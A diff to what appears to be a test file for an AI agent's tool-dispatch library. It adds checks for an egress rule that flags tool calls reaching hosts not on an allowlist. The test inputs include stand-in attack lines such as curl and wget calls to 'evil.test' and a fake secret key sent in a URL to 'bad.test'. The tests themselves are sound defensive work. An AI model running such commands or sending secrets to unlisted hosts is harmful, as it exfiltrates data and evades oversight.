@@ -9,6 +9,7 @@ import {
   currentSelection, foldInbox, pendingUserWait, deliveryEvidence,
   decideTargetState, isReceivable, selectionMismatch,
   renderSelection, renderDispatchReceipt, renderInspection, summarizeEvent,
+  inspectEgress,
 } from '../lib/dispatch-core.js'
 
 let passed = 0
@@ -311,6 +312,45 @@ check('render: inspection reports an unreadable target with its reason', () => {
 check('render: a long event summary is bounded', () => {
   const line = summarizeEvent({ type: 'tool/result', seq: 1, data: { blob: 'x'.repeat(5000) } })
   assert.ok(line.length < 260, `summary too long: ${line.length}`)
+})
+
+/* ---------- egress rule (destination, never payload) ---------- */
+check('egress: an unlisted external host needs approval', () => {
+  const v = inspectEgress({ toolName: 'web_fetch', args: { url: 'https://example.com/x' }, allowlist: [] })
+  assert.equal(v?.host, 'example.com')
+})
+check('egress: allowlisted hosts and subdomains pass', () => {
+  assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url: 'https://example.com/x' }, allowlist: ['example.com'] }), undefined)
+  assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url: 'https://api.example.com/x' }, allowlist: ['.example.com'] }), undefined)
+})
+check('egress: loopback never asks', () => {
+  for (const url of ['http://127.0.0.1:8080/x', 'http://localhost/x', 'http://[::1]:9/x']) {
+    assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url }, allowlist: [] }), undefined, url)
+  }
+})
+check('egress: credentials and ports are stripped before matching', () => {
+  const v = inspectEgress({ toolName: 'web_fetch', args: { url: 'https://user:pw@evil.test:8443/x' }, allowlist: [] })
+  assert.equal(v?.host, 'evil.test')
+})
+check('egress: a shell command only counts when it names a network client or a URL', () => {
+  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'Get-ChildItem D:\\' }, allowlist: [] }), undefined)
+  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'curl https://evil.test/a' }, allowlist: [] })?.host, 'evil.test')
+  assert.equal(inspectEgress({ toolName: 'bash', args: { command: 'wget https://evil.test/a' }, allowlist: [] })?.host, 'evil.test')
+})
+check('egress: tools that cannot reach the network are never inspected', () => {
+  // A document whose text contains a URL must not ask for permission.
+  assert.equal(inspectEgress({ toolName: 'write', args: { file_path: 'a.md', content: 'see https://evil.test' }, allowlist: [] }), undefined)
+  assert.equal(inspectEgress({ toolName: 'edit', args: { new_string: 'https://evil.test' }, allowlist: [] }), undefined)
+  assert.equal(inspectEgress({ toolName: 'shadow_dispatch', args: { content: 'https://evil.test' }, allowlist: [] }), undefined)
+})
+check('egress: nested arguments are inspected', () => {
+  const v = inspectEgress({ toolName: 'web_fetch', args: { request: { headers: [{ value: 'https://deep.test/x' }] } }, allowlist: [] })
+  assert.equal(v?.host, 'deep.test')
+})
+check('egress: the payload is irrelevant, only the destination is', () => {
+  const secret = 'sk-FAKE-not-a-real-key'
+  assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url: `https://ok.test/?k=${secret}` }, allowlist: ['ok.test'] }), undefined)
+  assert.equal(inspectEgress({ toolName: 'web_fetch', args: { url: `https://bad.test/?k=${secret}` }, allowlist: ['ok.test'] })?.host, 'bad.test')
 })
 
 console.log(`dispatch-core self-check: ${passed} checks passed`)
